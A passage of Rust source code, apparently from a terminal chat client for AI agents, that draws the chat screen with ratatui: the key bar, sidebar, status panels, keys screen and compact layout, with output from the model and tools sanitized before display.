//! Drawing the chat screen from [`App`]. Every piece of text that came
//! from the model, a tool or the gateway is passed through
//! [`sanitize`] here, at the last step before a cell.

use std::time::Instant;

use ratatui::Frame;
use ratatui::layout::{Constraint, Layout, Position, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Paragraph};

use super::app::{App, Entry, Overlay};
use super::panels::{SideItem, panels};
use super::text::{layout_input, sanitize, width, wrap};

/// Rows of a tool's output the transcript shows before it says the
/// rest is cut.
const TOOL_OUTPUT_ROWS: usize = 6;
/// Rows of draft the input box grows to.
const INPUT_ROWS: usize = 6;
/// Columns the sidebar and the panels take beside the transcript, and
/// the least the transcript keeps.
const SIDEBAR_COLS: u16 = 30;
const PANELS_COLS: u16 = 36;
const TRANSCRIPT_MIN_COLS: u16 = 54;
/// The width from which the sidebar and the panels sit beside the
/// transcript. Narrower is the compact layout: the transcript takes the
/// width, and the two open over it.
pub(crate) const WIDE_COLS: u16 = SIDEBAR_COLS + PANELS_COLS + TRANSCRIPT_MIN_COLS;

/// What a box drawn over the transcript says at its top right.
fn compact_note() -> String {
    format!("compact layout · side by side from {WIDE_COLS} columns")
}

/// The sidebar's and the panels' columns at `width`: none in the compact
/// layout, and each that is shown in the side-by-side one.
fn fit(width: u16, show_sidebar: bool, show_panels: bool) -> (u16, u16) {
    if width < WIDE_COLS {
        return (0, 0);
    }
    (
        if show_sidebar { SIDEBAR_COLS } else { 0 },
        if show_panels { PANELS_COLS } else { 0 },
    )
}

/// The chat's colors, by the role each plays on screen. Every cell is
/// drawn on [`palette::BG`]; the key bar on [`palette::BAR`].
pub(crate) mod palette {
    use ratatui::style::{Color, Style};

    pub const BG: Color = Color::Rgb(0x0f, 0x11, 0x15);
    pub const BAR: Color = Color::Rgb(0x1c, 0x21, 0x28);
    /// Text: what was said, and what a key does.
    pub const TEXT: Color = Color::Rgb(0xc9, 0xd1, 0xd9);
    /// Frame lines, rules and separators.
    pub const RULE: Color = Color::Rgb(0x6e, 0x76, 0x81);
    /// What the operator wrote or must read before answering.
    pub const WHITE: Color = Color::Rgb(0xff, 0xff, 0xff);
    /// What waits on the operator: a card, its tier.
    pub const AMBER: Color = Color::Rgb(0xf0, 0xb4, 0x29);
    /// Facts about the session: model, counts, labels.
    pub const GRAY: Color = Color::Rgb(0x8b, 0x94, 0x9e);
    /// Keys.
    pub const BLUE: Color = Color::Rgb(0x79, 0xc0, 0xff);
    /// The agent, and what the agent says.
    pub const CYAN: Color = Color::Rgb(0x56, 0xd4, 0xdd);
    /// Placeholders and what does not apply now.
    pub const DIM: Color = Color::Rgb(0x7d, 0x85, 0x90);
    /// A failure or a refusal.
    pub const RED: Color = Color::Rgb(0xff, 0xa1, 0x98);

    pub fn on_bg(fg: Color) -> Style {
        Style::default().fg(fg).bg(BG)
    }

    pub fn on_bar(fg: Color) -> Style {
        Style::default().fg(fg).bg(BAR)
    }
}

/// The key the bar keeps whatever its width: the keys screen.
pub(crate) const PINNED: (&str, &str) = ("Ctrl+G", "keys");
/// Cells kept clear between the last hint and the pinned key.
const BAR_GAP: usize = 2;

/// The key bar's hints, by state, most needed first. The bar drops them
/// from the right as the window narrows.
const HINTS: &[(&str, &str)] = &[
    ("Enter", "send"),
    ("Ctrl+J", "new line"),
    ("PgUp/PgDn", "scroll"),
    ("/", "commands"),
    ("Ctrl+F", "search"),
    ("Ctrl+N", "new"),
    ("Ctrl+C", "quit"),
];
/// Scrolled up, the way back leads.
const HINTS_SCROLLED: &[(&str, &str)] = &[
    ("End", "latest"),
    ("PgUp/PgDn", "scroll"),
    ("Enter", "send"),
    ("Ctrl+J", "new line"),
    ("/", "commands"),
    ("Ctrl+F", "search"),
];
/// At a card the answer rule is on the card; the bar has the rest.
const HINTS_CARD: &[(&str, &str)] = &[
    ("PgUp/PgDn", "scroll"),
    ("Ctrl+U", "clear answer"),
    ("Ctrl+K", "verify chain"),
];
const HINTS_EXPIRED: &[(&str, &str)] = &[("Enter", "dismiss"), ("PgUp/PgDn", "scroll")];
/// At a card that puts the conversation away there is nothing to scroll.
const HINTS_CARD_HIDDEN: &[(&str, &str)] =
    &[("Ctrl+U", "clear answer"), ("Ctrl+K", "verify chain")];
/// At the one line a short window shows, there is no answer to clear.
const HINTS_CARD_ONE_LINE: &[(&str, &str)] = &[("PgUp/PgDn", "scroll"), ("Ctrl+K", "verify chain")];
const HINTS_PANELS: &[(&str, &str)] = &[("↑↓", "scroll"), ("Esc", "close"), ("Ctrl+P", "close")];
const HINTS_KEYS: &[(&str, &str)] = &[("type", "to filter"), ("↑↓", "scroll"), ("Esc", "close")];
/// The keys screen's pinned key: the one that closes it.
const PINNED_KEYS: (&str, &str) = ("Ctrl+G", "close");
const HINTS_SEARCH: &[(&str, &str)] = &[
    ("type", "to filter"),
    ("↑↓", "select"),
    ("Enter", "open"),
    ("Esc", "close"),
];

/// The bottom row at `width`: as many of `hints` as fit, left to right,
/// and `pinned` at the right, which never drops.
pub(crate) fn key_bar(width: usize, hints: &[(&str, &str)], pinned: (&str, &str)) -> Line<'static> {
    use palette::{BAR, BG, BLUE, GRAY, RULE, on_bar};
    let pinned_width = width_of(pinned.0) + 1 + width_of(pinned.1);
    let room = width.saturating_sub(1 + pinned_width + 1);
    let mut spans = vec![Span::styled(" ", on_bar(GRAY))];
    let mut used = 0;
    for (i, (key, what)) in hints.iter().enumerate() {
        let sep = if i == 0 { 0 } else { 3 };
        let w = sep + width_of(key) + 1 + width_of(what);
        if used + w + BAR_GAP > room {
            break;
        }
        if sep > 0 {
            spans.push(Span::styled(" ", on_bar(GRAY)));
            spans.push(Span::styled("·", on_bar(RULE)));
            spans.push(Span::styled(" ", on_bar(GRAY)));
        }
        spans.push(Span::styled(key.to_string(), on_bar(BLUE)));
        spans.push(Span::styled(" ", on_bar(GRAY)));
        spans.push(Span::styled(what.to_string(), on_bar(GRAY)));
        used += w;
    }
    let pad = room.saturating_sub(used);
    spans.push(Span::styled(" ".repeat(pad), on_bar(GRAY)));
    let pin = Style::default().fg(BG).bg(BLUE);
    spans.push(Span::styled(pinned.0.to_string(), pin));
    spans.push(Span::styled(" ", pin));
    spans.push(Span::styled(pinned.1.to_string(), pin));
    spans.push(Span::styled(" ", Style::default().bg(BAR)));
    Line::from(spans)
}

fn width_of(s: &str) -> usize {
    width(s)
}

/// The hints for what the screen is showing now. `scrolled` is whether
/// the transcript, as drawn, has rows below the view.
fn hints_for(app: &App, scrolled: bool) -> &'static [(&'static str, &'static str)] {
    if app.expired.is_some() {
        HINTS_EXPIRED
    } else if app.front_card().is_some() {
        HINTS_CARD
    } else if app.overlay == Some(Overlay::Panels) {
        HINTS_PANELS
    } else if app.searching {
        HINTS_SEARCH
    } else if scrolled {
        HINTS_SCROLLED
    } else {
        HINTS
    }
}

pub(crate) fn draw(frame: &mut Frame<'_>, app: &App, now: Instant) {
    let screen = frame.area();
    frame.render_widget(
        Block::default().style(palette::on_bg(palette::TEXT)),
        screen,
    );
    // The bottom row is the key bar, across the whole width, whatever
    // else is drawn.
    let [full, bar_area] =
        Layout::vertical([Constraint::Min(0), Constraint::Length(1)]).areas(screen);
    let compact = full.width < WIDE_COLS;
    if app.keys.is_some() {
        draw_keys_screen(frame, app, full);
        frame.render_widget(
            Paragraph::new(key_bar(
                usize::from(bar_area.width),
                HINTS_KEYS,
                PINNED_KEYS,
            )),
            bar_area,
        );
        return;
    }
    // A card spans the window at every width while it is open: the side
    // columns are put away, and the transcript keeps what rows are left.
    if app.front_card().is_some() || app.expired.is_some() {
        let hints = draw_card_screen(frame, app, full, screen.height, now);
        frame.render_widget(
            Paragraph::new(key_bar(usize::from(bar_area.width), hints, PINNED)),
            bar_area,
        );
        return;
    }
    app.card_cut.set(false);
    app.card_one_line.set(false);
    // In the compact layout the conversations and the panels open over
    // the transcript, which is drawn again when they close.
    if compact && let Some(overlay) = app.overlay {
        match overlay {
            Overlay::Conversations => draw_conversations_over(frame, app, full),
            Overlay::Panels => draw_panels_over(frame, app, full),
        }
        frame.render_widget(
            Paragraph::new(key_bar(
                usize::from(bar_area.width),
                hints_for(app, false),
                PINNED,
            )),
            bar_area,
        );
        return;
    }
    let (side_cols, panel_cols) = fit(full.width, app.show_sidebar, app.show_panels);
    let [side_area, area, panel_area] = Layout::horizontal([
        Constraint::Length(side_cols),
        Constraint::Min(0),
        Constraint::Length(panel_cols),
    ])
    .areas(full);
    if side_cols > 0 {
        draw_sidebar(frame, app, side_area);
    }
    if panel_cols > 0 {
        draw_panels(frame, app, panel_area);
    }

    let inner_width = usize::from(area.width.saturating_sub(2)).max(1);
    let (input_rows, (cursor_row, cursor_col)) = layout_input(&app.draft, app.cursor, inner_width);
    let shown_rows = input_rows.len().min(INPUT_ROWS);
    let first_row = (cursor_row + 1).saturating_sub(shown_rows);
    let input_height = u16::try_from(shown_rows + 2).unwrap_or(u16::MAX);
    let input_title = if app.busy {
        "waiting for the reply"
    } else {
        "message"
    };
    let rows: Vec<String> = input_rows
        .iter()
        .skip(first_row)
        .take(shown_rows)
        .cloned()
        .collect();

    // The transcript and the draft are one box, the rule between them
    // saying where the view is.
    let below = draw_conversation(frame, app, area, input_title, &rows);
    let scrolled = below > 0;
    let input_area = Rect::new(
        area.x,
        area.bottom().saturating_sub(input_height),
        area.width,
        input_height,
    );
    if app.searching && side_cols > 0 {
        let x = side_area.x + 1 + u16::try_from(width(&app.search)).unwrap_or(0);
        frame.set_cursor_position(Position::new(
            x.min(side_area.right().saturating_sub(2)),
            side_area.y + 1,
        ));
    } else {
        let x = input_area.x + 1 + u16::try_from(cursor_col).unwrap_or(0);
        let y = input_area.y + 1 + u16::try_from(cursor_row - first_row).unwrap_or(0);
        frame.set_cursor_position(Position::new(
            x.min(input_area.right().saturating_sub(2)),
            y,
        ));
    }

    frame.render_widget(
        Paragraph::new(key_bar(
            usize::from(bar_area.width),
            hints_for(app, scrolled),
            PINNED,
        )),
        bar_area,
    );
}

/// `s` in `cols` cells, cut at its end with one `…` only when it does not
/// fit.
pub(crate) fn cut_end(s: &str, cols: usize) -> String {
    if width(s) <= cols {
        return s.to_string();
    }
    let mut out = String::new();
    for c in s.chars() {
        if width(&out) + width(&c.to_string()) + 1 > cols {
            break;
        }
        out.push(c);
    }
    out.push('…');
    out
}

/// `s` in `cols` cells, cut in its middle with one `…` when it does not
/// fit, so a model name keeps its version.
pub(crate) fn cut_middle(s: &str, cols: usize) -> String {
    let chars: Vec<char> = s.chars().collect();
    if chars.len() <= cols || cols < 3 {
        return cut_end(s, cols);
    }
    let head = (cols - 1) / 2;
    let tail = cols - 1 - head;
    let mut out: String = chars[..head].iter().collect();
    out.push('…');
    out.extend(&chars[chars.len() - tail..]);
    out
}

/// The agents and conversations as the sidebar lists them, filtered by
/// the search, at `cols` cells. A search that matches nothing says so,
/// and how to clear it.
fn side_lines(app: &App, cols: usize) -> Vec<Line<'static>> {
    use palette::{BLUE, GRAY, TEXT, WHITE, on_bg};
    let mut lines = Vec::new();
    let dir = &app.directory;
    let items = app.side_items();
    if items.is_empty() && !app.search.trim().is_empty() {
        lines.push(Line::raw(""));
        for row in wrap(
            &format!(
                "No conversation matches \"{}\".",
                sanitize(app.search.trim())
            ),
            cols.saturating_sub(1),
        ) {
            lines.push(Line::styled(format!(" {row}"), on_bg(WHITE)));
        }
        lines.push(Line::raw(""));
        for (key, what) in [("Esc", "clear the search"), ("Ctrl+N", "new chat")] {
            lines.push(Line::from(vec![
                Span::styled(" ", on_bg(TEXT)),
                Span::styled(format!("{key:<13}"), on_bg(BLUE)),
                Span::styled(what, on_bg(TEXT)),
            ]));
        }
        return lines;
    }
    for (i, item) in items.iter().enumerate() {
        let selected = app.searching && i == app.selected.min(items.len() - 1);
        let mut line = match item {
            SideItem::Agent(a) => {
                let agent = &dir.agents[*a];
                let current = agent.id == app.agent;
                let name = format!(
                    "{}{} ",
                    if current { "* " } else { "  " },
                    cut_end(&sanitize(&agent.id), 12)
                );
                let room = cols.saturating_sub(width(&name));
                Line::from(vec![
                    Span::styled(name, on_bg(if current { WHITE } else { TEXT })),
                    Span::styled(
                        cut_middle(
                            &sanitize(&format!("{}/{}", agent.provider, agent.model)),
                            room,
                        ),
                        on_bg(GRAY),
                    ),
                ])
            }
            SideItem::Conversation(c) => {
                let conv = &dir.conversations[*c];
                let title = sanitize(conv.title.as_deref().unwrap_or("(no message yet)"));
                let current = conv.conversation == app.conversation && conv.agent == app.agent;
                let time = conv.updated.get(11..16).unwrap_or("").to_string();
                // The time in a column of its own at the right.
                let room =
                    cols.saturating_sub(4 + if time.is_empty() { 0 } else { 1 + width(&time) });
                let title = cut_end(&title, room);
                let pad = room.saturating_sub(width(&title));
                let mut spans = vec![Span::styled(
                    format!("    {title}{}", " ".repeat(pad)),
                    on_bg(TEXT),
                )];
                if !time.is_empty() {
                    spans.push(Span::styled(format!(" {time}"), on_bg(GRAY)));
                }
                Line::from(spans).style(if current {
                    Style::default().add_modifier(Modifier::UNDERLINED)
                } else {
                    Style::default()
                })
            }
        };
        if selected {
            line = line.style(Style::default().add_modifier(Modifier::REVERSED));
        }
        lines.push(line);
    }
    lines
}

fn draw_sidebar(frame: &mut Frame<'_>, app: &App, area: Rect) {
    use palette::{BLUE, GRAY, RULE, WHITE, on_bg};
    let mut lines = vec![
        if app.searching || !app.search.is_empty() {
            Line::styled(format!("search: {}", sanitize(&app.search)), on_bg(WHITE))
        } else {
            Line::from(vec![
                Span::styled("Ctrl+F", on_bg(BLUE)),
                Span::styled(" search", on_bg(GRAY)),
            ])
        },
        Line::from(vec![
            Span::styled("Ctrl+N", on_bg(BLUE)),
            Span::styled(" new chat", on_bg(GRAY)),
        ]),
        Line::raw(""),
    ];
    lines.extend(side_lines(
        app,
        usize::from(area.width.saturating_sub(2)).max(1),
    ));
    frame.render_widget(
        Paragraph::new(lines).block(
            Block::default()
                .borders(Borders::ALL)
                .border_style(on_bg(RULE))
                .title(Line::styled(" agents ", on_bg(palette::TEXT)))
                .title_bottom(
                    Line::from(vec![
                        Span::styled(" ", on_bg(RULE)),
                        Span::styled("Ctrl+B", on_bg(BLUE)),
                        Span::styled(" hide", on_bg(GRAY)),
                        Span::styled(" ", on_bg(RULE)),
                    ])
                    .right_aligned(),
                ),
        ),
        area,
    );
}

/// A box over the transcript in the compact layout: `title` at its top
/// left and the layout note at its right, `body` inside, and, when there
/// is an `input`, a rule named `rule` over one row of typed text. The
/// rule's right end says `count`. Returns where the typed text is.
fn draw_over(
    frame: &mut Frame<'_>,
    area: Rect,
    title: &str,
    body: Vec<Line<'static>>,
    input: Option<(&str, &str, Option<String>)>,
) -> (Rect, Rect) {
    use palette::{DIM, GRAY, RULE, TEXT, WHITE, on_bg};
    let mut block = Block::default()
        .borders(Borders::ALL)
        .border_style(on_bg(RULE))
        .title(Line::styled(format!(" {title} "), on_bg(WHITE)));
    // The layout note, where the layout is the compact one.
    if area.width < WIDE_COLS {
        let note = compact_note();
        let (before, after) = note.split_once(" · ").unwrap_or((&note, ""));
        block = block.title(
            Line::from(vec![
                Span::styled(format!(" {before} "), on_bg(TEXT)),
                Span::styled("·", on_bg(RULE)),
                Span::styled(format!(" {after} "), on_bg(GRAY)),
            ])
            .right_aligned(),
        );
    }
    frame.render_widget(block, area);
    let extra = if input.is_some() { 2 } else { 0 };
    let inner = Rect::new(
        area.x + 1,
        area.y + 1,
        area.width.saturating_sub(2),
        area.height.saturating_sub(2 + extra),
    );
    frame.render_widget(Paragraph::new(body), inner);
    let Some((rule, typed, count)) = input else {
        return (inner, Rect::default());
    };
    let rule_y = inner.bottom();
    let name = format!(" {rule} ");
    let count = count.map(|c| format!(" {c} ")).unwrap_or_default();
    let fill = usize::from(area.width).saturating_sub(2 + width_of(&name) + width_of(&count));
    frame.render_widget(
        Paragraph::new(Line::from(vec![
            Span::styled("├", on_bg(RULE)),
            Span::styled(name, on_bg(GRAY)),
            Span::styled("─".repeat(fill), on_bg(RULE)),
            Span::styled(count, on_bg(TEXT)),
            Span::styled("┤", on_bg(RULE)),
        ])),
        Rect::new(area.x, rule_y, area.width, 1),
    );
    let field = Rect::new(area.x + 1, rule_y + 1, area.width.saturating_sub(2), 1);
    let line = if typed.is_empty() {
        Line::styled(" type to filter", on_bg(DIM))
    } else {
        Line::styled(sanitize(typed), on_bg(WHITE))
    };
    frame.render_widget(Paragraph::new(line), field);
    (inner, field)
}

/// The conversations over the transcript, as Ctrl+B or Ctrl+F opens them
/// in the compact layout: the list, and the search with what is typed.
fn draw_conversations_over(frame: &mut Frame<'_>, app: &App, area: Rect) {
    let cols = usize::from(area.width.saturating_sub(2)).max(1);
    let count = (!app.search.is_empty()).then(|| {
        let all = app.directory.conversations.len();
        let shown = app
            .side_items()
            .iter()
            .filter(|i| matches!(i, SideItem::Conversation(_)))
            .count();
        format!("{shown} of {all} match")
    });
    let (_, field) = draw_over(
        frame,
        area,
        "conversations",
        side_lines(app, cols),
        Some(("search", &app.search, count)),
    );
    let x = field.x + u16::try_from(width(&app.search)).unwrap_or(0);
    frame.set_cursor_position(Position::new(
        x.min(field.right().saturating_sub(1)),
        field.y,
    ));
}

/// Cells a key takes on the keys screen before what it does.
const KEY_COLUMN: usize = 13;

/// One row of a column on the keys screen.
enum KeyRow {
    /// A group's heading, and what follows it dimmed.
    Heading(&'static str, Option<String>),
    /// A key and what it does; dimmed when it does not apply now.
    Key(&'static str, &'static str, bool),
    Text(String),
    Blank,
}

/// Where each `text` matches `filter`, ignoring case, drawn on `style`,
/// with the matched cells set apart.
fn marked(text: &str, filter: &str, style: Style) -> Vec<Span<'static>> {
    let mark = Style::default().fg(palette::BG).bg(palette::AMBER);
    // Character by character: a lowercased string can be longer than
    // the one it came from, so positions in it are no use in the text.
    let lower = |c: char| c.to_lowercase().next().unwrap_or(c);
    let needle: Vec<char> = filter.chars().map(lower).collect();
    if needle.is_empty() {
        return vec![Span::styled(text.to_string(), style)];
    }
    let chars: Vec<char> = text.chars().collect();
    let (mut spans, mut plain, mut i) = (Vec::new(), String::new(), 0);
    while i < chars.len() {
        let here = chars.len() - i >= needle.len()
            && needle
                .iter()
                .enumerate()
                .all(|(k, n)| lower(chars[i + k]) == *n);
        if here {
            if !plain.is_empty() {
                spans.push(Span::styled(std::mem::take(&mut plain), style));
            }
            spans.push(Span::styled(
                chars[i..i + needle.len()].iter().collect::<String>(),
                mark,
            ));
            i += needle.len();
        } else {
            plain.push(chars[i]);
            i += 1;
        }
    }
    if !plain.is_empty() {
        spans.push(Span::styled(plain, style));
    }
    spans
}

/// The keys screen: every key and command in groups, filtered by what
/// is typed, over the whole screen.
fn draw_keys_screen(frame: &mut Frame<'_>, app: &App, area: Rect) {
    use super::app::{KEYS, MOUSE};
    use palette::{BLUE, DIM, TEXT, WHITE, on_bg};
    let screen = app.keys.as_ref().expect("the keys screen is open");
    let filter = screen.filter.trim();
    let wide = area.width >= WIDE_COLS;
    let hit = |s: &str| filter.is_empty() || s.to_lowercase().contains(&filter.to_lowercase());

    // Each group's rows under the filter: all of a group whose heading
    // matches, else the entries that do; nothing when none does.
    let waiting = app.cards.len();
    let mut groups: Vec<(&str, Vec<KeyRow>)> = Vec::new();
    let (mut total, mut shown) = (0, 0);
    for group in KEYS {
        let whole = hit(group.title);
        let mut rows = Vec::new();
        for (key, what) in group.keys {
            total += 1;
            if whole || hit(key) || hit(what) {
                shown += 1;
                let applies = group.title != "APPROVALS"
                    || *key == "Ctrl+K"
                    || if *key == "Esc" {
                        app.expired.is_some()
                    } else {
                        waiting > 0
                    };
                rows.push(KeyRow::Key(key, what, !applies));
            }
        }
        if rows.is_empty() {
            continue;
        }
        let suffix = (group.title == "APPROVALS").then(|| match waiting {
            0 => "none waiting".to_string(),
            n => format!("{n} waiting"),
        });
        rows.insert(0, KeyRow::Heading(group.title, suffix));
        groups.push((group.title, rows));
    }
    total += 1;
    if hit("MOUSE") || hit(MOUSE.0) || hit(MOUSE.1) {
        shown += 1;
        let mut rows = vec![KeyRow::Heading("MOUSE", None), KeyRow::Text(MOUSE.0.into())];
        if wide && filter.is_empty() {
            rows.push(KeyRow::Text(MOUSE.1.into()));
        }
        groups.push(("MOUSE", rows));
    }
    if wide && filter.is_empty() {
        let text = format!(
            "From {WIDE_COLS} columns, conversations and panels sit beside the transcript. \
             Narrower, they open over it."
        );
        let mut rows = vec![KeyRow::Heading("LAYOUT", None)];
        rows.extend(wrap(&text, 38).into_iter().map(KeyRow::Text));
        groups.push(("LAYOUT", rows));
    }

    let count = (!filter.is_empty()).then(|| format!("{shown} of {total} match"));
    let (inner, field) = draw_over(
        frame,
        area,
        "keys and commands",
        Vec::new(),
        Some(("filter", &screen.filter, count)),
    );
    let x = field.x + u16::try_from(width(&screen.filter)).unwrap_or(0);
    frame.set_cursor_position(Position::new(
        x.min(field.right().saturating_sub(1)),
        field.y,
    ));

    // The columns: three side by side, two in the compact layout, one
    // when filtered and it fits. Groups are set apart by a blank row
    // where every column has the room.
    let placement: &[&[&str]] = if wide {
        &[
            &["SCROLL", "WRITE", "CONVERSATIONS"],
            &["APPROVALS", "SCREEN", "MOUSE"],
            &["COMMANDS", "LAYOUT"],
        ]
    } else {
        &[
            &["SCROLL", "WRITE", "CONVERSATIONS", "APPROVALS"],
            &["SCREEN", "COMMANDS", "MOUSE"],
        ]
    };
    let height = usize::from(inner.height);
    let stack = |names: &[&str], gaps: bool| -> Vec<&KeyRow> {
        let mut out = Vec::new();
        for (title, rows) in groups.iter().filter(|(t, _)| names.contains(t)) {
            let _ = title;
            if gaps && !out.is_empty() {
                out.push(&KeyRow::Blank);
            }
            out.extend(rows.iter());
        }
        out
    };
    let every: Vec<&str> = groups.iter().map(|(t, _)| *t).collect();
    let one = stack(&every, true);
    let columns: Vec<Vec<&KeyRow>> = if !filter.is_empty() && one.len() <= height {
        vec![one]
    } else {
        let gaps = placement
            .iter()
            .all(|names| stack(names, true).len() <= height);
        placement.iter().map(|names| stack(names, gaps)).collect()
    };
    let longest = columns.iter().map(Vec::len).max().unwrap_or(0);
    let offset = screen.scroll.min(longest.saturating_sub(height));
    let n = u16::try_from(placement.len()).unwrap_or(1);
    let span = area.width.saturating_sub(2);
    let start = |i: u16| area.x + 2 + (i * span).div_ceil(n);
    for (i, column) in columns.iter().enumerate() {
        let i = u16::try_from(i).unwrap_or(0);
        let x = start(i);
        let right = if i + 1 < n {
            start(i + 1).saturating_sub(1)
        } else {
            area.right().saturating_sub(1)
        };
        let w = right.saturating_sub(x);
        for (r, row) in column.iter().skip(offset).take(height).enumerate() {
            let y = inner.y + u16::try_from(r).unwrap_or(0);
            let spans = match row {
                KeyRow::Blank => continue,
                KeyRow::Heading(title, suffix) => {
                    let mut spans = marked(title, filter, on_bg(WHITE));
                    if let Some(suffix) = suffix {
                        spans.push(Span::styled(format!(" · {suffix}"), on_bg(DIM)));
                    }
                    spans
                }
                KeyRow::Key(key, what, dim) => {
                    let (k, d) = if *dim {
                        (on_bg(DIM), on_bg(DIM))
                    } else {
                        (on_bg(BLUE), on_bg(TEXT))
                    };
                    let mut spans = marked(key, filter, k);
                    spans.push(Span::styled(
                        " ".repeat(KEY_COLUMN.saturating_sub(width(key))),
                        k,
                    ));
                    spans.extend(marked(what, filter, d));
                    spans
                }
                KeyRow::Text(text) => marked(text, filter, on_bg(TEXT)),
            };
            frame.render_widget(Paragraph::new(Line::from(spans)), Rect::new(x, y, w, 1));
        }
    }
}

/// The panels over the transcript, as Ctrl+P opens them in the compact
/// layout: each panel's title, then its lines.
fn draw_panels_over(frame: &mut Frame<'_>, app: &App, area: Rect) {
    use palette::{TEXT, WHITE, on_bg};
    let cols = usize::from(area.width.saturating_sub(2)).max(1);
    let mut body = Vec::new();
    match &app.status {
        None => body.push(Line::styled("asking the gateway...", on_bg(TEXT))),
        Some(status) => {
            for panel in panels(status, app.verified.as_ref()) {
                body.push(Line::styled(panel.title.to_string(), on_bg(WHITE)));
                for l in panel.lines {
                    for row in wrap(&sanitize(&l), cols) {
                        body.push(Line::styled(row, on_bg(TEXT)));
                    }
                }
            }
        }
    }
    // Taller than the window, the panels scroll with the arrows.
    let rows = usize::from(area.height.saturating_sub(2));
    let skip = app.panels_scroll.min(body.len().saturating_sub(rows));
    draw_over(
        frame,
        area,
        "panels",
        body.into_iter().skip(skip).collect(),
        None,
    );
}

/// The panels in one frame beside the transcript: a rule per section,
/// the exec runtime wrapped under its label, and a Tools list that does
/// not fit ending in how many more there are.
fn draw_panels(frame: &mut Frame<'_>, app: &App, area: Rect) {
    use palette::{BLUE, GRAY, RULE, TEXT, on_bg};
    let inner = usize::from(area.width.saturating_sub(2)).max(1);
    let rule = |title: &str, right: Option<(&str, &str)>, top: bool| -> Line<'static> {
        let (left, end) = if top { ("┌", "┐") } else { ("├", "┤") };
        let title = format!(" {title} ");
        let right_width = right.map_or(0, |(k, w)| {
            width_of(k) + if w.is_empty() { 0 } else { 1 + width_of(w) } + 2
        });
        let fill = inner.saturating_sub(width_of(&title) + right_width);
        let mut spans = vec![
            Span::styled(left, on_bg(RULE)),
            Span::styled(title, on_bg(TEXT)),
            Span::styled("─".repeat(fill), on_bg(RULE)),
        ];
        if let Some((key, what)) = right {
            spans.push(Span::styled(" ", on_bg(RULE)));
            spans.push(Span::styled(key.to_string(), on_bg(BLUE)));
            if !what.is_empty() {
                spans.push(Span::styled(format!(" {what}"), on_bg(GRAY)));
            }
            spans.push(Span::styled(" ", on_bg(RULE)));
        }
        spans.push(Span::styled(end, on_bg(RULE)));
        Line::from(spans)
    };
    let row = |mut spans: Vec<Span<'static>>| -> Line<'static> {
        let used: usize = spans.iter().map(|s| width_of(&s.content)).sum();
        spans.insert(0, Span::styled("│", on_bg(RULE)));
        spans.push(Span::styled(
            " ".repeat(inner.saturating_sub(used)),
            on_bg(TEXT),
        ));
        spans.push(Span::styled("│", on_bg(RULE)));
        Line::from(spans)
    };
    let height = usize::from(area.height);
    let mut lines: Vec<Line<'static>> = Vec::new();
    let Some(status) = &app.status else {
        lines.push(rule("status", None, true));
        lines.push(row(vec![Span::styled(
            "asking the gateway...",
            on_bg(TEXT),
        )]));
        while lines.len() + 1 < height {
            lines.push(row(Vec::new()));
        }
        lines.push(Line::styled(
            format!("└{}┘", "─".repeat(inner)),
            on_bg(RULE),
        ));
        frame.render_widget(Paragraph::new(lines), area);
        return;
    };
    let shown = panels(status, app.verified.as_ref());
    let sections = shown.len();
    for (i, panel) in shown.into_iter().enumerate() {
        let is_tools = panel.title == "Tools";
        let hint = match panel.title {
            "Tools" => Some(("/tools", "")),
            "Audit" => Some(("Ctrl+K", "verify")),
            _ => None,
        };
        lines.push(rule(panel.title, hint, i == 0));
        let mut texts: Vec<String> = panel.lines.iter().map(|l| sanitize(l)).collect();
        // The key is on the Audit rule; the line that names it goes.
        texts.retain(|l| l != VERIFY_LINE);
        match panel.title {
            // The mode goes on the runtime's line, which wraps under
            // its label.
            "Environment" => {
                if let Some(at) = texts.iter().position(|l| l.starts_with("exec "))
                    && at + 1 < texts.len()
                    && texts[at + 1].starts_with("       ")
                {
                    let mode = texts.remove(at + 1);
                    texts[at] = format!("{} · {}", texts[at], mode.trim());
                }
            }
            "Cost and tokens" if texts.len() > 2 => {
                let rest = texts.split_off(1).join(" · ");
                texts.push(rest);
            }
            _ => {}
        }
        // Rows left for this section, keeping one for each section still
        // to come and one for the frame's bottom.
        let after = sections - i - 1;
        let room = height.saturating_sub(lines.len() + after * 2 + 1);
        let mut rows: Vec<Line<'static>> = Vec::new();
        for (j, text) in texts.iter().enumerate() {
            if is_tools && j == 1 {
                let names: Vec<&str> = status.tools.names.iter().map(String::as_str).collect();
                let left = room.saturating_sub(rows.len());
                for r in tool_names(&names, inner, left) {
                    rows.push(row(vec![Span::styled(r, on_bg(TEXT))]));
                }
                continue;
            }
            // A label column: Environment's lines are a name padded to
            // seven cells, then its value.
            let label = (panel.title == "Environment" && text.chars().count() > ENV_LABEL)
                .then_some(ENV_LABEL);
            match label {
                Some(at) => {
                    let (name, value) = text.split_at(at);
                    for (k, r) in wrap(value, inner.saturating_sub(at))
                        .into_iter()
                        .enumerate()
                    {
                        let lead = if k == 0 {
                            name.to_string()
                        } else {
                            " ".repeat(at)
                        };
                        rows.push(row(vec![
                            Span::styled(lead, on_bg(if k == 0 { GRAY } else { TEXT })),
                            Span::styled(r, on_bg(TEXT)),
                        ]));
                    }
                }
                None => {
                    for r in wrap(text, inner) {
                        rows.push(row(vec![Span::styled(r, on_bg(TEXT))]));
                    }
                }
            }
        }
        rows.truncate(room);
        lines.extend(rows);
    }
    while lines.len() + 1 < height {
        lines.push(row(Vec::new()));
    }
    lines.truncate(height.saturating_sub(1));
    lines.push(bottom_hint(inner, &[("Ctrl+P", "hide")]));
    frame.render_widget(Paragraph::new(lines), area);
}

/// A frame's bottom border of `inner` cells between its corners, the
/// `hints` at its right end, key and what it does, ` · ` between them.
/// Without room for them the border is plain.
fn bottom_hint(inner: usize, hints: &[(&str, &str)]) -> Line<'static> {
    use palette::{BLUE, GRAY, RULE, on_bg};
    let mut spans = Vec::new();
    for (i, (key, what)) in hints.iter().enumerate() {
        if i > 0 {
            spans.push(Span::styled(" · ", on_bg(RULE)));
        }
        spans.push(Span::styled(key.to_string(), on_bg(BLUE)));
        spans.push(Span::styled(format!(" {what}"), on_bg(GRAY)));
    }
    let used: usize = spans.iter().map(|s| width_of(&s.content)).sum();
    if hints.is_empty() || used + 3 > inner {
        return Line::styled(format!("└{}┘", "─".repeat(inner)), on_bg(RULE));
    }
    let mut line = vec![Span::styled(
        format!("└{} ", "─".repeat(inner - used - 2)),
        on_bg(RULE),
    )];
    line.extend(spans);
    line.push(Span::styled(" ┘", on_bg(RULE)));
